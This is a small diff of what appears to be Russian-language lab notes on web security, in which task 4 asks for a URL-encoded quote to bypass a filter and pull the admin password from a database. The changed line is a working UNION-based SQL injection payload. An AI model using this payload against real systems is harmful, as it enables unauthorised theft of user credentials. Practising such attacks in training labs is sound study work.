@@ -19,4 +19,4 @@
 
 ## Задание 4
 ### Обойти защиту с помощью кодирования кавычки в альтернативный формат (Url encoded) и получить пароль из БД.
-%27 union select pass from users where name = %27admin%27--
+    %27 union select pass from users where name = %27admin%27--
